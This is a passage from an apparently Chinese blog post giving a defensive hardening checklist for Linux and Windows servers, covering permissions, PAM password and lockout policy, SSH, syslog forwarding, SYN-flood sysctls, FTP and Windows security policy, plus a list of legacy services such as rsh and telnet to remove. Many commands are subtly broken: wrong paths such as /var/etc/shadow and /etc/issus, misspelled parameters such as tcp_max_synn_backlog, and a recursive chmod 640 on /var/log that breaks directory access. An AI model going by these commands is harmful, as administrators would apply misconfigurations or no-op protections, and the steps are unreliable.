/etc/shadow</span><br><span class="line"><span class="built_in">chmod</span> 644 /etc/group</span><br><span class="line"><span class="comment">#去除多余的写入操作  全改</span></span><br><span class="line"><span class="built_in">chmod</span> -R go-w /etc</span><br></pre></td></tr></table></figure>

<p>visudo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#visudo中  !以后的为不允许使用该命令</span></span><br><span class="line">username   host=/usr/sbin/useradd, !/usr/bin/vim /etc/hosts,!/usr/bin/passwd root</span><br></pre></td></tr></table></figure>

<p>检查高权限文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.find / -type f \( -perm -00007 \) -a -ctime -1 -exec ls -lg &#123;&#125; \;</span><br><span class="line">ctime -1 :一天内状态改变过的项</span><br><span class="line">mtime:内容修改</span><br><span class="line">atime:被访问</span><br></pre></td></tr></table></figure>

<h6 id="禁止任何人su为root账户"><a href="#禁止任何人su为root账户" class="headerlink" title="禁止任何人su为root账户"></a>禁止任何人su为root账户</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改su的配置为配置文件</span></span><br><span class="line">/etc/pam.d/su</span><br><span class="line">	auth  sufficient   /lib/security/pam.rootok.so</span><br><span class="line">	auth  required     /lib/security/pam_wheel.so</span><br><span class="line">	group=wheel</span><br><span class="line"><span class="comment">#如果需要su切换，将用户加入wheel组</span></span><br><span class="line">gpasswd -a username wheel</span><br></pre></td></tr></table></figure>



<h6 id="去除不需要的账号，修改默认账号shell环境"><a href="#去除不需要的账号，修改默认账号shell环境" class="headerlink" title="去除不需要的账号，修改默认账号shell环境"></a>去除不需要的账号，修改默认账号shell环境</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除/锁定多余的用户与组</span></span><br><span class="line">userdel -r username</span><br><span class="line">groupdel groupname</span><br><span class="line">passwd -l username</span><br><span class="line"><span class="comment">#修改程序账户的登录shell</span></span><br><span class="line">usermod -s /sbin/nologin username</span><br></pre></td></tr></table></figure>

<h6 id="限制超级管理员远程登录"><a href="#限制超级管理员远程登录" class="headerlink" title="限制超级管理员远程登录"></a>限制超级管理员远程登录</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改远程管理程序ssh的配置文件</span></span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">   permitRootLogin <span class="built_in">yes</span></span><br><span class="line">   ↓</span><br><span class="line">   permitRootLogin no</span><br><span class="line"><span class="comment">#重启sshd服务</span></span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>

<h6 id="去掉所有suid和sgid"><a href="#去掉所有suid和sgid" class="headerlink" title="去掉所有suid和sgid"></a>去掉所有suid和sgid</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 防止提权</span><br><span class="line">#查找具有suid和sgid的对象</span><br><span class="line">find / -type f \( -perm -04000 -o -perm -02000 \) -exec ls -lg &#123;&#125; \;</span><br><span class="line">find / -type f \( -perm -04000 -o -perm -02000 \) |xargs -l &#123;&#125; ls -lh &#123;&#125;</span><br><span class="line">chmod ugo-s 对象</span><br></pre></td></tr></table></figure>



<h6 id="删除root以外UID为0的用户"><a href="#删除root以外UID为0的用户" class="headerlink" title="删除root以外UID为0的用户"></a>删除root以外UID为0的用户</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#检查哪些账户的UID为0</span></span><br><span class="line">awk -F: <span class="string">&#x27;($3 == 0) &#123; print $1 &#125;&#x27;</span> /etc/passwd</span><br></pre></td></tr></table></figure>

<p>删除账户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">userdel -r username</span><br></pre></td></tr></table></figure>

<p>或者编辑passwd与shadow文件</p>
<h6 id="不应存在位于高权组的账户"><a href="#不应存在位于高权组的账户" class="headerlink" title="不应存在位于高权组的账户"></a>不应存在位于高权组的账户</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 检查哪些账户属于其他组</span></span><br><span class="line">grep -v ^<span class="comment"># /etc/login.defs |grep &quot;^GID_MIN&quot; | awk &#x27;&#123;print $2&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">awk -F: <span class="string">&#x27;$3&gt;500&#123;print $1&#125;&#x27;</span> /etc/passwd |xargs -I &#123;&#125; grep &#123;&#125; /etc/group</span><br><span class="line"></span><br><span class="line">grep -v <span class="string">&quot;/sbin/nologin&quot;</span> /etc/passwd | awk -F: <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I &#123;&#125; grep &#123;&#125; /etc/group</span><br></pre></td></tr></table></figure>

<h6 id="缩短默认密码生存周期"><a href="#缩短默认密码生存周期" class="headerlink" title="缩短默认密码生存周期"></a>缩短默认密码生存周期</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改文件密码策略文件</span></span><br><span class="line">vi /etc/login.defs</span><br><span class="line">	PASS_MAX_DAYS 90   	<span class="comment">#最长使用期限90天</span></span><br><span class="line">	PASS_MIN_DAYS 0     <span class="comment">#最短使用期限0天</span></span><br><span class="line">	PASS_MIN_LEN  8     <span class="comment">#密码最小长度8位</span></span><br><span class="line">	PASS_WARN_AGE 7     <span class="comment">#最长期限到期前7天提醒更改密码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="设置密码强度策略"><a href="#设置密码强度策略" class="headerlink" title="设置密码强度策略"></a>设置密码强度策略</h6><p>目的：规范使用高强度密码，延长被爆破的时间</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改pam认证文件</span></span><br><span class="line">vi /etc/pam.d/system-auth</span><br><span class="line">	password requisite, pam_cracklib.so</span><br><span class="line">	try_first_pass retry=3 dcredit=-1 1credit=-1</span><br><span class="line">	ucredit=-1 ocredit=-1 minclass=3 minlen=8</span><br><span class="line"></span><br><span class="line"><span class="comment">#centos7以后设置密码复杂度</span></span><br><span class="line">authconfig --passminlen=8 --update    <span class="comment"># 密码最短八位</span></span><br><span class="line">authconfig --enablereqlower --update  <span class="comment">#包含一个小写</span></span><br><span class="line">authconfig --enablerequpper --update  <span class="comment">#包含一个大写</span></span><br><span class="line">authconfig --enablereqdigit --update  <span class="comment">#包含一个数字</span></span><br><span class="line">authconfig --enablereqother --update  <span class="comment">#包含一个字符</span></span><br><span class="line"></span><br><span class="line">在文件/etc/security/pwquality.conf</span><br></pre></td></tr></table></figure>

<h6 id="设置强制密码历史"><a href="#设置强制密码历史" class="headerlink" title="设置强制密码历史"></a>设置强制密码历史</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改pam认证文件</span></span><br><span class="line">/etc/pam.d/system-auth</span><br><span class="line">	password sufficient pam_unix.so sha512 shadow</span><br><span class="line">	nullok try_first_pass use_authtok remember=5</span><br></pre></td></tr></table></figure>

<h6 id="设置账户锁定策略"><a href="#设置账户锁定策略" class="headerlink" title="设置账户锁定策略"></a>设置账户锁定策略</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改pam认证文件</span></span><br><span class="line">/etc/pam.d/system-auth</span><br><span class="line">/etc/pam.d/sshd</span><br><span class="line">/etc/pam.d/login</span><br><span class="line">	auth required pam_tally2.so deny=6</span><br><span class="line">	unlock_time=300 even_deny_root</span><br><span class="line">	root_unlock_time=60</span><br><span class="line"><span class="comment">#强制解锁账户的命令</span></span><br><span class="line">pam_tally2 --user zhangsan --reset</span><br></pre></td></tr></table></figure>

<h6 id="修改umask值"><a href="#修改umask值" class="headerlink" title="修改umask值"></a>修改umask值</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改启动脚本文件</span></span><br><span class="line">/etc/profile</span><br><span class="line">/etc/csh.login</span><br><span class="line">/etc/csh.cshrc</span><br><span class="line">/etc/bashrc</span><br><span class="line"><span class="comment">#在文件末尾加入umask值 反码</span></span><br><span class="line"><span class="built_in">umask</span> 027   <span class="comment"># 权限750</span></span><br></pre></td></tr></table></figure>

<h6 id="限制硬件资源"><a href="#限制硬件资源" class="headerlink" title="限制硬件资源"></a>限制硬件资源</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改限制文件  减缓ddos带来的危害  </span></span><br><span class="line"><span class="comment">#加入以下内容</span></span><br><span class="line">vi /etc/security/limits.conf</span><br><span class="line">	soft core  0</span><br><span class="line">	hard core  0</span><br><span class="line">	hard rss   5000   <span class="comment">#限制5m的内存</span></span><br><span class="line">	hard <span class="built_in">nproc</span> 20     <span class="comment">#限制20个进程</span></span><br><span class="line">	</span><br></pre></td></tr></table></figure>



<p>在文件末尾加入信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">session required /lib64/security/pam_limit.so</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>日常收集进程数使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps aux | grep httpd | wc -l</span><br></pre></td></tr></table></figure>

<h6 id="启用日志功能，使用日志服务器"><a href="#启用日志功能，使用日志服务器" class="headerlink" title="启用日志功能，使用日志服务器"></a>启用日志功能，使用日志服务器</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#日志接收方</span></span><br><span class="line"><span class="comment"># 修改应用服务器日志配置文件</span></span><br><span class="line">vi /etc/rsyslog.conf</span><br><span class="line">	<span class="comment">#开启接收日志功能</span></span><br><span class="line">	<span class="variable">$ModLoad</span> imudp</span><br><span class="line">	<span class="variable">$UDPServerRun</span> 514</span><br><span class="line">	<span class="variable">$template</span> Remote,<span class="string">&quot;/var/1og/%<span class="variable">$YEAR</span>%-%<span class="variable">$MONTH</span>%-%<span class="variable">$DAY</span>%/%fromhost-ip%.log&quot;</span> <span class="comment">#远程日志路径</span></span><br><span class="line">	:formhost-ip,isequal,<span class="string">&quot;127.0.0.1&quot;</span> ?Remote <span class="comment">#本地日志不存储远程文件 </span></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">systemctl restart rsyslog</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#日志发送方</span></span><br><span class="line"><span class="comment"># 确认关键日志审计是否存在</span></span><br><span class="line">*.info;mail.none;authpriv.none;cron.none   /var/log/messages</span><br><span class="line">authpriv.*                                 /var/log/secure</span><br><span class="line"><span class="comment">#添加两行转发日志信息</span></span><br><span class="line">*.info;mail.none;authpriv.none;cron.none   @192.168.2.1</span><br><span class="line">authpriv.*                                 @192.168.2.1</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">systemctl restart rsyslog</span><br><span class="line"><span class="comment">#设置权限为640</span></span><br><span class="line"><span class="built_in">ls</span> -al /var/log/</span><br><span class="line"><span class="built_in">chmod</span> -R 640 /var/log</span><br></pre></td></tr></table></figure>

<h6 id="设置关键文件底层属性"><a href="#设置关键文件底层属性" class="headerlink" title="设置关键文件底层属性"></a>设置关键文件底层属性</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改关键文件和日志的底层属性，降低篡改风险</span></span><br><span class="line">chattr +a /var/log/message</span><br><span class="line">chattr +i /var/log/message.*</span><br><span class="line">chattr +i /var/etc/shadow</span><br><span class="line">chattr +i /var/etc/passwd</span><br><span class="line">chattr +i /var/etc/group</span><br><span class="line"><span class="comment"># 不只限于上述文件，可用lsattr查看更改结果</span></span><br></pre></td></tr></table></figure>

<h6 id="对用户使用ls-rm设置别名"><a href="#对用户使用ls-rm设置别名" class="headerlink" title="对用户使用ls,rm设置别名"></a>对用户使用ls,rm设置别名</h6><p>目的，让ls随时看清文件属性</p>
<p>让rm需要确认后删除目标实施方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改当前用户的登录启动脚本</span></span><br><span class="line">vi ~/.bashrc</span><br><span class="line">	<span class="built_in">alias</span>  <span class="built_in">ls</span>=<span class="string">&quot;ls -alh&quot;</span></span><br><span class="line">	<span class="built_in">alias</span>  <span class="built_in">rm</span>=<span class="string">&quot;rm-i&quot;</span></span><br></pre></td></tr></table></figure>

<h6 id="对开放目录设置粘滞键"><a href="#对开放目录设置粘滞键" class="headerlink" title="对开放目录设置粘滞键"></a>对开放目录设置粘滞键</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 目的，允许小规模开放目录，用户作为暂存目录使用</span><br><span class="line">chmod +t /tmp/</span><br></pre></td></tr></table></figure>



<h5 id="通讯协议"><a href="#通讯协议" class="headerlink" title="通讯协议"></a>通讯协议</h5><h6 id="使用加密的远程管理ssh"><a href="#使用加密的远程管理ssh" class="headerlink" title="使用加密的远程管理ssh"></a>使用加密的远程管理ssh</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">	PermitRootLogin   no</span><br><span class="line">	Port              20202</span><br><span class="line">	Protocol          2</span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>

<h6 id="设置访问控制列表"><a href="#设置访问控制列表" class="headerlink" title="设置访问控制列表"></a>设置访问控制列表</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改拒绝策略 </span></span><br><span class="line">vi /etc/hosts.deny</span><br><span class="line">	ALL:ALL</span><br><span class="line"><span class="comment"># 修改允许策略</span></span><br><span class="line">vi /etc/hosts.allow</span><br><span class="line">	sshd: &lt;来访者IP地址&gt;</span><br></pre></td></tr></table></figure>

<h6 id="不响应ICMP请求"><a href="#不响应ICMP请求" class="headerlink" title="不响应ICMP请求"></a>不响应ICMP请求</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改网络策略布尔值</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br></pre></td></tr></table></figure>

<h6 id="禁止处理无源路由"><a href="#禁止处理无源路由" class="headerlink" title="禁止处理无源路由"></a>禁止处理无源路由</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止被无源路由抓包  防arp攻击</span></span><br><span class="line"><span class="comment"># 检查是否开启了路由功能</span></span><br><span class="line">sysctl -n net.ipv4.conf.all.accept_source_route</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/net/ipv4/conf/all/accept_source_route</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h6 id="打开syn队列-syn-cookie"><a href="#打开syn队列-syn-cookie" class="headerlink" title="打开syn队列  syn cookie"></a>打开syn队列  syn cookie</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 缓解syn flood攻击  syn洪水</span><br><span class="line">vi /etc/sysctl.conf</span><br><span class="line">	net.ipv4.tcp_syncookies = 1</span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure>

<h6 id="防御syn-flood攻击优化"><a href="#防御syn-flood攻击优化" class="headerlink" title="防御syn flood攻击优化"></a>防御syn flood攻击优化</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 修改半连接上限，缓解syn flood攻击</span></span><br><span class="line"><span class="comment"># 查询当前半连接上限</span></span><br><span class="line">sysctl net.ipv4.tcp_max_syn_backlog</span><br><span class="line"><span class="comment"># 修改半连接上限</span></span><br><span class="line">sysctl -w net.ipv4.tcp_max_synn_backlog =<span class="string">&quot;2048&quot;</span></span><br></pre></td></tr></table></figure>

<p>FTP使用黑白名单限制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止非法账户访问ftp</span></span><br><span class="line"><span class="comment"># 检查黑名单文件是否包括高危账户</span></span><br><span class="line">/etc/ftpusers</span><br><span class="line">root daemon bin sys adm lp uucp nuucp listen nobody noaccess nobody4</span><br><span class="line"><span class="comment"># 使用白名单文件</span></span><br><span class="line">/etc/user_list</span><br><span class="line">	userlist_deny=NO</span><br><span class="line">	userlist_enable=YES</span><br></pre></td></tr></table></figure>

<h6 id="设置FTP上传的文件权限"><a href="#设置FTP上传的文件权限" class="headerlink" title="设置FTP上传的文件权限"></a>设置FTP上传的文件权限</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止被上传执行脚本</span></span><br><span class="line"><span class="comment"># 检查主配置文件/etc/vsftpd.conf是否存在如下内容</span></span><br><span class="line">	write_enable=YES</span><br><span class="line">	local_umask=022</span><br><span class="line">	anon_umask=022</span><br></pre></td></tr></table></figure>

<h6 id="检查账户目录中是否存在高危文件-netrc、-rhosts"><a href="#检查账户目录中是否存在高危文件-netrc、-rhosts" class="headerlink" title="检查账户目录中是否存在高危文件.netrc、.rhosts"></a>检查账户目录中是否存在高危文件.netrc、.rhosts</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止被使用远程登录漏洞</span></span><br><span class="line"><span class="comment"># 检查账户home目录中是否存在远程主机文件</span></span><br><span class="line"><span class="keyword">for</span> DIR <span class="keyword">in</span> <span class="string">&#x27;cut -d&quot;:&quot; -f6 /etc/passwd&#x27;</span>; <span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [ -e <span class="variable">$DIR</span>/.netrc ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$DIR</span>/.netrc&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment"># 无返回值则表示正常</span></span><br></pre></td></tr></table></figure>

<h6 id="FTP设置banner信息"><a href="#FTP设置banner信息" class="headerlink" title="FTP设置banner信息"></a>FTP设置banner信息</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止泄露服务信息</span></span><br><span class="line">/etc/vsftpd.conf <span class="comment"># 是否存在如下内容  有的话删除掉</span></span><br><span class="line">	ftpd_banner=<span class="string">&quot;Authorized users only. All activity may be monitored and reported.&quot;</span></span><br></pre></td></tr></table></figure>

<p>配置可信任的NTP服务器，并确保服务开启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 保持时间同步，防止某些服务错误</span></span><br><span class="line"><span class="comment"># 检查主配置文件/etc/ntp.conf是否存在如下内容</span></span><br><span class="line">	server X.X.X.X</span><br><span class="line"><span class="comment"># 确保服务被启用</span></span><br><span class="line">systemctl <span class="built_in">enable</span> ntpd</span><br><span class="line">systemctl status ntpd</span><br></pre></td></tr></table></figure>

<h6 id="固化常用DNS解析"><a href="#固化常用DNS解析" class="headerlink" title="固化常用DNS解析"></a>固化常用DNS解析</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改hosts文件</span></span><br><span class="line">vi /etc/hosts</span><br><span class="line">	61.59.123.22 www.baidu.com</span><br></pre></td></tr></table></figure>

<h6 id="关闭telnet"><a href="#关闭telnet" class="headerlink" title="关闭telnet"></a>关闭telnet</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 降低被抓包后获取系统关键信息</span></span><br><span class="line"><span class="comment"># 修改telnet配置文件</span></span><br><span class="line">vim /etc/xinetd.d/telnet</span><br><span class="line">	<span class="built_in">disable</span>=<span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<h5 id="补丁管理"><a href="#补丁管理" class="headerlink" title="补丁管理"></a>补丁管理</h5><h6 id="补丁装载"><a href="#补丁装载" class="headerlink" title="补丁装载"></a>补丁装载</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 最好去官方找rpm包，安装补丁，下载时一定要进行签名校验</span><br><span class="line">yum update</span><br><span class="line"># http://www.redhat.com/corp/support/errata</span><br><span class="line">rpm -Fvh rpm包</span><br><span class="line"># 测试环境测试完，在安装</span><br></pre></td></tr></table></figure>

<h5 id="服务进程与启动"><a href="#服务进程与启动" class="headerlink" title="服务进程与启动"></a>服务进程与启动</h5><h6 id="关闭NFS服务"><a href="#关闭NFS服务" class="headerlink" title="关闭NFS服务"></a>关闭NFS服务</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止被外挂文件系统，导致入侵</span></span><br><span class="line"><span class="comment"># 检查是否存在敏感进程</span></span><br><span class="line">ps aux | grep -E <span class="string">&quot;lockd|nfsd|statd|mountd&quot;</span></span><br><span class="line"><span class="comment"># 检查关闭NFS相关服务</span></span><br><span class="line">systemctl list-unit-files |grep nfs</span><br><span class="line">systemctl <span class="built_in">disable</span> nfs-client.target</span><br></pre></td></tr></table></figure>

<h6 id="关闭无用服务"><a href="#关闭无用服务" class="headerlink" title="关闭无用服务"></a>关闭无用服务</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭无用服务，提高系统性能，降低漏洞风险</span></span><br><span class="line"><span class="comment"># 检查有哪些自启动服务，并记录列表</span></span><br><span class="line">systemctl list-unit-files |grep <span class="built_in">enable</span></span><br><span class="line"><span class="comment"># 禁用无用服务</span></span><br><span class="line">systemctl stop &lt; 服务名&gt;</span><br><span class="line">systemctl disabled &lt;服务名&gt;</span><br></pre></td></tr></table></figure>

<h6 id="建议关闭的服务"><a href="#建议关闭的服务" class="headerlink" title="建议关闭的服务"></a>建议关闭的服务</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa | grep -E &quot;^amanda|^chargen|^chargen-udp|^cups|^cups-lpd|^daytime|^daytime-udp|^echo|^echo-udp|^eklogin|^ekrb5-telnet|^finger|^gssftp|^imapl^imaps|^ipop2|ipop3|^klogin|^krb5-telnet|^kshell|^ktalk|^ntalk|^rexec|^rlogin|^rsh|^rsync|^talk|^tcpmux-server|^telnet|^tftp|^time-dgram|^time-stream|^uucp&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="banner与自动注销"><a href="#banner与自动注销" class="headerlink" title="banner与自动注销"></a>banner与自动注销</h5><h6 id="隐藏系统提示信息"><a href="#隐藏系统提示信息" class="headerlink" title="隐藏系统提示信息"></a>隐藏系统提示信息</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看登录banner信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/issus</span><br><span class="line"><span class="comment"># 清空banner文件</span></span><br><span class="line"><span class="built_in">echo</span> &gt; /etc/issus</span><br></pre></td></tr></table></figure>

<p>设置登录超时注销</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改信息</span></span><br><span class="line">vi /etc/profile</span><br><span class="line">	HISTFILESIZE=50   <span class="comment"># 只能看50行</span></span><br><span class="line"><span class="comment"># 生效</span></span><br><span class="line">	<span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>

<h6 id="跳过grup菜单"><a href="#跳过grup菜单" class="headerlink" title="跳过grup菜单"></a>跳过grup菜单</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 防止在grup菜单对引导过程进行修改</span><br><span class="line"># 修改grup配置文件</span><br><span class="line">vi /boot/grup2/grup.cfg</span><br><span class="line"># 修改等时</span><br><span class="line">set timeout=0</span><br></pre></td></tr></table></figure>

<h6 id="关闭ctrl-alt-del重启功能"><a href="#关闭ctrl-alt-del重启功能" class="headerlink" title="关闭ctrl+alt+del重启功能"></a>关闭ctrl+alt+del重启功能</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line">vi /usr/lib/systemd/system/ctrl-alt-del.target</span><br><span class="line">	<span class="comment">#注释所有内容</span></span><br></pre></td></tr></table></figure>

<h4 id="windows加固方向"><a href="#windows加固方向" class="headerlink" title="windows加固方向"></a>windows加固方向</h4><h5 id="账号管理与认证授权"><a href="#账号管理与认证授权" class="headerlink" title="账号管理与认证授权"></a>账号管理与认证授权</h5><p>按用户类型分配账户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 根据系统要求，设定不同的账户和组，管理员，数据库sa，审计用户，来宾用户</span></span><br><span class="line">打开本地用户和计算机管理器</span><br><span class="line">	打开运行，输入lusrmgr.msc</span><br><span class="line">	根据用户要求将账号加入功能组</span><br><span class="line">		右击账户-&gt; 属性-&gt;更改隶属于</span><br><span class="line">		右击功能组-&gt;属性-&gt;成员</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="清理系统无用账户"><a href="#清理系统无用账户" class="headerlink" title="清理系统无用账户"></a>清理系统无用账户</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#目的: 删除或锁定设备运行，维护等工作无关的账号，提高系统账号安全性</span></span><br><span class="line">打开本地用户和计算机管理器</span><br><span class="line">	打开运行，输入lusrmgr.msc</span><br><span class="line">删除或者锁无关账号(删除操作不可逆)</span><br><span class="line">右击账户-&gt;删除</span><br><span class="line">右击账户-&gt;属性-&gt;账户已禁用</span><br></pre></td></tr></table></figure>

<h6 id="重命名administrator-禁用guest"><a href="#重命名administrator-禁用guest" class="headerlink" title="重命名administrator,禁用guest"></a>重命名administrator,禁用guest</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 减少账户被爆破可能性，提高系统访问安全性</span></span><br><span class="line">打开本地用户和计算机管理器</span><br><span class="line">	打开运行，输入lusrmgr.msc</span><br><span class="line">为管理员administrator账户改名</span><br><span class="line">	右击administrator-&gt;重命名-&gt;属性-&gt;全名</span><br><span class="line">禁用来宾guest</span><br><span class="line">	右击guest -&gt;属性-&gt;账户已禁用</span><br><span class="line">	</span><br><span class="line"><span class="comment">#power user 组 权限仅次于administrator</span></span><br></pre></td></tr></table></figure>

<h6 id="设置密码策略"><a href="#设置密码策略" class="headerlink" title="设置密码策略"></a>设置密码策略</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止弱口令出现，降低爆破的可能性</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">找到密码策略</span><br><span class="line">	账户策略-&gt;密码策略</span><br><span class="line">    修改默认值</span><br><span class="line">        密码必须符合复杂性要求:禁用-&gt; 启用</span><br><span class="line">        密码长度最小值: 0-&gt;8</span><br><span class="line">        密码最短使用期限: 0天</span><br><span class="line">        密码最长使用期限:42天-&gt;90天</span><br><span class="line">        强制密码历史:1-&gt;5</span><br><span class="line">        用可还原的加密来存储:禁用</span><br></pre></td></tr></table></figure>

<h6 id="配置账户锁定策略"><a href="#配置账户锁定策略" class="headerlink" title="配置账户锁定策略"></a>配置账户锁定策略</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:有效降低administrator以外的账户被爆破的几率</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">找到账户锁定策略</span><br><span class="line">	账户策略-&gt;账户锁定策略</span><br><span class="line">		账户锁定时间: 未定义-&gt;30分钟</span><br><span class="line">		账户锁定阈值: 0-&gt;6</span><br><span class="line">		复位账户锁定计数器: 未定义-&gt;30分钟</span><br></pre></td></tr></table></figure>

<p>远程关机权限设置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:防止远程用户非法关闭系统</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">找到用户权限分配</span><br><span class="line">	本地策略-&gt;用户权限分配</span><br><span class="line">	关闭系统策略中，只保留administrator组</span><br><span class="line">	从远程系统强制关机</span><br><span class="line">	拒绝本地登录</span><br><span class="line">	拒绝从网络访问这台计算器</span><br></pre></td></tr></table></figure>

<h6 id="取得文件或对象的所有权设置"><a href="#取得文件或对象的所有权设置" class="headerlink" title="取得文件或对象的所有权设置"></a>取得文件或对象的所有权设置</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:防止用户非法绕过NTFS权限，获取文件内容</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">找到用户权限分配</span><br><span class="line">	本地策略-&gt;用户权限分配</span><br><span class="line">	取得文件或对象的所有权策略，只保留administrator组</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>设置从本地登录此计算机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:防止用户非法登录主机</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">找到用户权限分配</span><br><span class="line">	本地策略-&gt;用户权限分配</span><br><span class="line">	从本地登陆此计算机策略，加入授权用户</span><br></pre></td></tr></table></figure>

<h5 id="日志配置"><a href="#日志配置" class="headerlink" title="日志配置"></a>日志配置</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 通过审核策略，记录系统登录事件，对象访问事件，软件安装事件，安全事件等</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">找到审核策略</span><br><span class="line">	本地策略-&gt;审核策略</span><br><span class="line">修改审核策略</span><br><span class="line">	<span class="string">&quot;审核策略更改&quot;</span>      设置为<span class="string">&quot;成功&quot;</span>和<span class="string">&quot;失败&quot;</span>都要审核</span><br><span class="line">	<span class="string">&quot;审核对象访问&quot;</span>      设置为<span class="string">&quot;成功&quot;</span>和<span class="string">&quot;失败&quot;</span>都要审核</span><br><span class="line">    <span class="string">&quot;审核目录服务器访问&quot;</span> 设置为<span class="string">&quot;成功&quot;</span>和<span class="string">&quot;失败&quot;</span>都要审核</span><br><span class="line">    <span 